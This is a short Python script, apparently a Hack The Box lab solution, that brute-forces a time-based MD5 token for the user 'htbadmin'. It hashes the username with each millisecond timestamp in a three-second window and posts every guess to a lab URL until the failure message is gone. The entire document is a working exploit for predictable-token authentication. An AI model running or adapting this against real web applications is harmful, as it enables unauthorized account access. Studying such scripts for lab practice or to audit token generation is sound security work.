from hashlib import md5
import requests
from sys import exit
from time import time
import datetime
from pytz import timezone

url = "http://165.22.115.197:30813/question1/"
tz = timezone('GMT')
timenow = datetime.datetime.now(tz)
now = (timenow.now().strftime("%s"))
epoch = int(now) * 1000

start_time = epoch - 1500
fail_text = "Wrong token"
user="htbadmin"
endtime=epoch + 1500

for x in range(start_time, endtime+1):
    raw_data = user+str(x)
    md5_token = md5(str(raw_data).encode()).hexdigest()
    data ={"token":md5_token,"submit":"check"}

    print("checking {} {}".format(str(x), md5_token))

    res = requests.post(url, data=data)

    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()


exit()